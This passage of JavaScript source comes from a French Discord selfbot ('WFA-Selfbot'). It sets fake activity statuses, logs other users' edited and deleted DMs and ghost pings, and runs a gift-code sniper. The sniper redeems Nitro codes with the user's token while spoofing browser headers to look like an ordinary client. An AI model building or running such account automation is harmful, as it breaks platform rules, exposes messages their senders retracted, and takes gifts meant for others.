          let da = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'snapchat')
            .then((dc) => {
              let dd = new rpcGenerator.Rpc()
                .setName('Snapchat')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Snapchat')
                .setAssetsLargeImage(dc.id)
                .setAssetsLargeText('BE YOUNG WITH WFA')
                .setState(da)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dd.toDiscord()).catch((de) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande snapchat executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + da + ' sur Snapchat**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'facebook')) {
          let dc = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'facebook')
            .then((dd) => {
              let de = new rpcGenerator.Rpc()
                .setName('Facebook')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Skype')
                .setAssetsLargeImage(dd.id)
                .setAssetsLargeText('BE MORE OLD WITH WFA')
                .setState(dc)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(de.toDiscord()).catch((df) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande facebook executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + dc + ' sur Facebook**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'tiktok')) {
          let dd = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'tiktok')
            .then((de) => {
              let df = new rpcGenerator.Rpc()
                .setName('Tiktok')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Tiktok')
                .setAssetsLargeImage(de.id)
                .setAssetsLargeText('BE A PUTE WITH WFA')
                .setState(dd)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(df.toDiscord()).catch((dg) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande tiktok executé')
              )
              T.edit(':white_check_mark: **Tu regardes ' + dd + ' sur Tiktok**')
            })
        }
        if (T.content.startsWith(prefix + 'twitter')) {
          let de = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'twitter')
            .then((df) => {
              let dh = new rpcGenerator.Rpc()
                .setName('Twitter')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Twitter')
                .setAssetsLargeImage(df.id)
                .setAssetsLargeText('BE A E-FUCKER WITH WFA')
                .setState(de)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dh.toDiscord()).catch((di) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande twitter executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + de + ' sur Twitter**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'instagram')) {
          let dg = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'instagram')
            .then((dh) => {
              let di = new rpcGenerator.Rpc()
                .setName('Instagram')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Instagram')
                .setAssetsLargeImage(dh.id)
                .setAssetsLargeText('BE INFLUENCER WITH WFA')
                .setState(dg)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(di.toDiscord()).catch((dj) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande instagram executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + dg + ' sur Instagram**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'youtube')) {
          let dh = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'youtube')
            .then((di) => {
              let dj = new rpcGenerator.Rpc()
                .setName('Youtube')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Youtube')
                .setAssetsLargeImage(di.id)
                .setAssetsLargeText('BE YOUTUBER WITH WFA')
                .setState(dh)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dj.toDiscord()).catch((dk) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande youtube executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + dh + ' sur Youtube**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'tokyo ghoul')) {
          let di = V.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'tokyo').then((dj) => {
            let dl = new rpcGenerator.Rpc()
              .setName('Tokyo Ghoul')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('WATCHING')
              .setApplicationId('603405368940429315')
              .setDetails('Tokyo Ghoul')
              .setAssetsLargeImage(dj.id)
              .setAssetsLargeText('WFA-Selfbot')
              .setState(di)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(dl.toDiscord()).catch((dm) => {})
            console.log(
              consolecolor.instagram('[COMMANDE] Commande tokyo ghoul executé')
            )
            T.edit(
              ':white_check_mark: **Tu regardes ' + di + ' sur Tokyo Ghoul**'
            )
          })
        }
        if (T.content.startsWith(prefix + 'hunter x hunter')) {
          let dl = V.splice(3).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'hxh').then((dm) => {
            let dn = new rpcGenerator.Rpc()
              .setName('Hunter X Hunter')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('WATCHING')
              .setApplicationId('603405368940429315')
              .setDetails('Hunter X Hunter')
              .setAssetsLargeImage(dm.id)
              .setAssetsLargeText('WFA-Selfbot')
              .setState(dl)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(dn.toDiscord()).catch((dp) => {})
            console.log(
              consolecolor.instagram(
                '[COMMANDE] Commande hunter x hunter executé'
              )
            )
            T.edit(
              ':white_check_mark: **Tu regardes ' +
                dl +
                ' sur Hunter X Hunter**'
            )
          })
        }
        if (T.content.startsWith(prefix + 'naruto')) {
          let dm = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('721465320740487179', 'naruto')
            .then((dn) => {
              let dp = new rpcGenerator.Rpc()
                .setName('Naruto')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('721465320740487179')
                .setDetails('Naruto')
                .setAssetsLargeImage(dn.id)
                .setAssetsLargeText('WFA-Selfbot R')
                .setState(dm)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dp.toDiscord()).catch((dq) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande naruto executé')
              )
              T.edit(':white_check_mark: **Tu regardes ' + dm + ' sur Naruto**')
            })
        }
        if (T.content.startsWith(prefix + 'pornhub')) {
          let dp = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'pornhub')
            .then((dq) => {
              let du = new rpcGenerator.Rpc()
                .setName('Pornhub')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('WATCHING')
                .setApplicationId('603405368940429315')
                .setDetails('Pornhub')
                .setAssetsLargeImage(dq.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dp)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(du.toDiscord()).catch((dv) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande pornhub executé')
              )
              T.edit(
                ':white_check_mark: **Tu regardes ' + dp + ' sur Pornhub**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'clash of clan')) {
          let dq = V.splice(3).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('721465320740487179', 'clash-of-clans-app-icon')
            .then((dr) => {
              let ds = new rpcGenerator.Rpc()
                .setName('Clash Of Clan')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('721465320740487179')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dr.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dq)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(ds.toDiscord()).catch((dt) => {})
              console.log(
                consolecolor.instagram(
                  '[COMMANDE] Commande clash of clans executé'
                )
              )
              T.edit(
                ':white_check_mark: **Tu joues à ' + dq + ' sur Clash Of Clan**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'minecraft')) {
          let dr = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'minecraft')
            .then((ds) => {
              let du = new rpcGenerator.Rpc()
                .setName('Minecraft')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(ds.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dr)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(du.toDiscord()).catch((dv) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande minecraft executé')
              )
              T.edit(
                ':white_check_mark: **Tu joues à ' + dr + ' sur Minecraft**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'clash royal')) {
          let dt = V.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'clashroyal')
            .then((du) => {
              let dx = new rpcGenerator.Rpc()
                .setName('Clash Royal')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(du.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dt)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dx.toDiscord()).catch((dy) => {})
              console.log(
                consolecolor.instagram(
                  '[COMMANDE] Commande clash royale executé'
                )
              )
              T.edit(
                ':white_check_mark: **Tu joues à ' + dt + ' sur Clash Royal**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'tinder')) {
          let du = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'tinder')
            .then((dv) => {
              let dy = new rpcGenerator.Rpc()
                .setName('Tinder')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dv.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(du)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dy.toDiscord()).catch((dz) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande tinder executé')
              )
              T.edit(':white_check_mark: **Tu joues à ' + du + ' sur Tinder**')
            })
        }
        if (T.content.startsWith(prefix + 'roblox')) {
          let dv = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'roblox')
            .then((dw) => {
              let dx = new rpcGenerator.Rpc()
                .setName('Roblox')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dw.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dv)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dx.toDiscord()).catch((dy) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande roblox executé')
              )
              T.edit(':white_check_mark: **Tu joues à ' + dv + ' sur Roblox**')
            })
        }
        if (T.content.startsWith(prefix + 'badlion')) {
          let dx = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'badlion')
            .then((dy) => {
              let dz = new rpcGenerator.Rpc()
                .setName('Badlion')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dy.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dx)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dz.toDiscord()).catch((dA) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande badlion executé')
              )
              T.edit(':white_check_mark: **Tu joues à ' + dx + ' sur Badlion**')
            })
        }
        if (T.content.startsWith(prefix + 'apex')) {
          let dz = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'apex').then((dA) => {
            let dB = new rpcGenerator.Rpc()
              .setName('Apex Legends')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('PLAYING')
              .setApplicationId('603405368940429315')
              .setDetails('WFA-Selfbot')
              .setAssetsLargeImage(dA.id)
              .setAssetsLargeText('WFA-Selfbot')
              .setState(dz)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(dB.toDiscord()).catch((dC) => {})
            console.log(
              consolecolor.instagram('[COMMANDE] Commande apex executé')
            )
            T.edit(
              ':white_check_mark: **Tu joues à ' + dz + ' sur Apex Legends**'
            )
          })
        }
        if (T.content.startsWith(prefix + 'csgo')) {
          let dB = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator.getRpcImage('603405368940429315', 'csgo').then((dC) => {
            let dF = new rpcGenerator.Rpc()
              .setName('Counter Strike')
              .setUrl('https://www.twitch.tv/OGAGAL_risitas')
              .setType('PLAYING')
              .setApplicationId('603405368940429315')
              .setDetails('WFA-Selfbot')
              .setAssetsLargeImage(dC.id)
              .setAssetsLargeText('WFA-Selfbot')
              .setState(dB)
              .setStartTimestamp(Date.now())
              .setParty({ id: uuid() })
            client.user.setPresence(dF.toDiscord()).catch((dG) => {})
            console.log(
              consolecolor.instagram('[COMMANDE] Commande csgo executé')
            )
            T.edit(':white_check_mark: **Tu joues à ' + dB + ' sur csgo**')
          })
        }
        if (T.content.startsWith(prefix + 'among us')) {
          let dC = V.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImage('603405368940429315', 'amongus')
            .then((dD) => {
              let dE = new rpcGenerator.Rpc()
                .setName('Among us')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA-Selfbot')
                .setAssetsLargeImage(dD.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dC)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dE.toDiscord()).catch((dF) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande among us executé')
              )
              T.edit(
                ':white_check_mark: **Tu joues à ' + dC + ' sur among us**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'fortnite')) {
          let dE = V.splice(1).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'fortnite')
            .then((dF) => {
              let dG = new rpcGenerator.Rpc()
                .setName('Fortnite')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setApplicationId('603405368940429315')
                .setDetails('WFA Selfbot')
                .setAssetsLargeImage(dF.id)
                .setAssetsLargeText('WFA-Selfbot E')
                .setState(dE)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dG.toDiscord()).catch((dH) => {})
              console.log(
                consolecolor.instagram('[COMMANDE] Commande fortnite executé')
              )
              T.edit(
                ':white_check_mark: **Tu joues à ' + dE + ' sur fortnite**'
              )
            })
        }
        if (T.content.startsWith(prefix + 'rocket league')) {
          let dG = V.splice(2).join(' ') || 'WFA-Selfbot'
          rpcGenerator
            .getRpcImages('603405368940429315', 'rocket_league')
            .then((dH) => {
              let dI = new rpcGenerator.Rpc()
                .setName('Rocket League')
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType('PLAYING')
                .setJoinSecret('MTI4NzM0OjFpMmhuZToxMjMxMjM')
                .setPartyId('ae488379-351d-4a4f-ad32-2b9b01c91657')
                .setApplicationId('603405368940429315')
                .setDetails('WFA Selfbot')
                .setAssetsLargeImage(dH.id)
                .setAssetsLargeText('WFA-Selfbot')
                .setState(dG)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(dI.toDiscord()).catch((dJ) => {})
              console.log(
                consolecolor.instagram(
                  '[COMMANDE] Commande rocket league executé'
                )
              )
              T.edit(
                ':white_check_mark: **Tu joues à ' + dG + ' sur rocket league**'
              )
            })
        }
      })
      client.on('messageUpdate', (T) => {
        if (T.author.id === client.user.id) {
          return
        }
        if (T.channel.type === 'dm') {
          console.log(' ')
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(consolecolor.atlas('[EVENT] Message mp modifié:'))
          console.log(consolecolor.atlas('[EVENT] User: ' + T.author.tag))
          console.log(consolecolor.atlas('[EVENT] Contient: ' + T.content))
          console.log(consolecolor.atlas('[EVENT] Le: ' + T.createdAt))
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(' ')
        }
      })
      client.on('messageDelete', (T) => {
        if (T.author.id === client.user.id) {
          return
        }
        if (T.channel.type === 'dm') {
          console.log(' ')
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(consolecolor.atlas('[EVENT] Message mp supprimé:'))
          console.log(consolecolor.atlas('[EVENT] User: ' + T.author.tag))
          console.log(consolecolor.atlas('[EVENT] Contient: ' + T.content))
          console.log(consolecolor.atlas('[EVENT] Le: ' + T.createdAt))
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(' ')
        }
        if (T.content.includes('@everyone') || T.content.includes('@here')) {
          if (T.author.id === client.user.id) {
            return
          }
          if (T.channel.type === 'dm') {
            return
          }
          console.log(' ')
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(consolecolor.atlas('[EVENT] Nouveau GhostPing:'))
          console.log(consolecolor.atlas('[EVENT] Serveur: ' + T.guild.name))
          console.log(consolecolor.atlas('[EVENT] Salon: ' + T.channel.name))
          console.log(consolecolor.atlas('[EVENT] User: ' + T.author.tag))
          console.log(consolecolor.atlas('[EVENT] Contient: ' + T.content))
          console.log(consolecolor.atlas('[EVENT] Le: ' + T.createdAt))
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          )
          console.log(' ')
        } else {
          return
        }
      })
      function S(T, U) {
        let W = T.match(
          /https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/
        )
        if (W) {
          return U(W[0]), S(T.slice(W.index + W[0].length), U)
        } else {
          U(null)
        }
      }
      client.on('message', (T) => {
        let V = []
        S(T.content, (W) => {
          if (!W) {
            return
          }
          if (!V.includes(W)) {
            V.push(W)
          }
        })
        if (V.length == 0) {
          return
        }
        V.forEach((W) => {
          const Z = { channel_id: T.channel.id }
          fetch(
            'https://canary.discordapp.com/api/v6/entitlements/gift-codes/' +
              W.split('/').pop() +
              '/redeem',
            {
              method: 'post',
              headers: {
                Accept: '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US',
                Authorization: client.token,
                Connection: 'keep-alive',
                'Content-Length': JSON.stringify(Z).length,
                'Content-Type': 'application/json',
                Host: 'canary.discordapp.com',
                Referer:
                  'https://canary.discordapp.com/channels/' +
                  T.channel.id +
                  '/' +
                  T.id,
                'User-Agent':
                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                'X-super-properties': Buffer.from(
                  JSON.stringify({
                    os: 'Windows',
                    browser: 'Firefox',
                    device: '',
                    browser_user_agent:
                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                    browser_version: '66.0',
                    os_version: '10',
                    referrer: '',
                    referring_domain: '',
                    referrer_current: '',
                    referring_domain_current: '',
                    release_channel: 'canary',
                    client_build_number: 37519,
                    client_event_source: null,
                  }),
                  'utf-8'
                ).toString('base64'),
              },
              body: JSON.stringify({ channel_id: T.channel.id }),
            }
          )
            .then((a0) => {
              if (a0.status == 400 || a0.status == 404) {
                return console.log(('code invalide :  ' + W).red)
              }
              a0.json().then((a4) => {
                console.log(a4)
                console.log(' ')
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(
                  consolecolor.atlas(
                    '[EVENT] Un nitro a surement été ajouté a tes credits'
                  )
                )
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(' ')
              })
            })
            .catch(console.error)
        })
      })
      client.on('guildDelete', (T) => {
        console.log(' '),
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          ),
          console.log(
            consolecolor.atlas('[EVENT] Vous avez quitté le serveur ' + T.name)
          ),
          console.log(
            consolecolor.fruit(
              '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
            )
          ),
          console.log(' ')
      })
      client.on('guildCreate', (T) => {
        console.log(' ')
        console.log(
          consolecolor.fruit(
            '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
          )
        )
        console.log(
          consolecolor.atlas('[EVENT] Vous avez rejoint le serveur ' + T.name)
        )
        console.log(
          consolecolor.fruit(
            '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
          )
        )
        console.log(' ')
      })
      process.on('unhandledRejection', (T) => {})
      process.on('unhandledRejection', (T, U) => {})
      process.on('uncaughtException', (T, U) => {})
      process.on('uncaughtExceptionMonitor', (T, U) => {})
      process.on('beforeExit', (T) => {})
      process.on('exit', (T) => {})
      process.on('multipleResolves', (T, U, V) => {})
      client.on('error', (T) => {})
      client.on('reconnecting', (T) => {
        console.log('Reconnexion en cours...')
      })
      client.on('resume', (T) => {})
      client.on('disconnect', (T) => {
        console.log('deconnexion en cours...')
      })
      client.login(token).catch((T) => {
        if (T) {
          console.log(
            'Token invalid!\nChange ton token dans le config.json'.red
          )
        }
      })
    }
    if (language == 'en') {
      let T = ''
      if (d.includes(ver)) {
      } else {
        T =
          '[MESSAGE] The ' +
          d +
          ' version is available !\nMise a jour en cours...'
      }
      let U = ' '
      if (d.includes(ver)) {
      } else {
        U = '[#] New version: ' + d + ' is available !\nWork in progress...'
      }
      let V = nsfw
      if (V == 'on') {
        V = 'Activated'
      }
      if (nsfw !== 'on') {
        V = 'Off'
      }
      client.on('ready', async () => {
        if (client.user.premium > 0) {
          var a4 = 'on'
        } else {
          var a4 = 'off'
        }
        if (client.user.bot) {
          var a5 = 'yes'
          process.exit(1)
        } else {
          var a5 = 'no'
        }
        console.clear()
        console.log(
          consolecolor.passion(
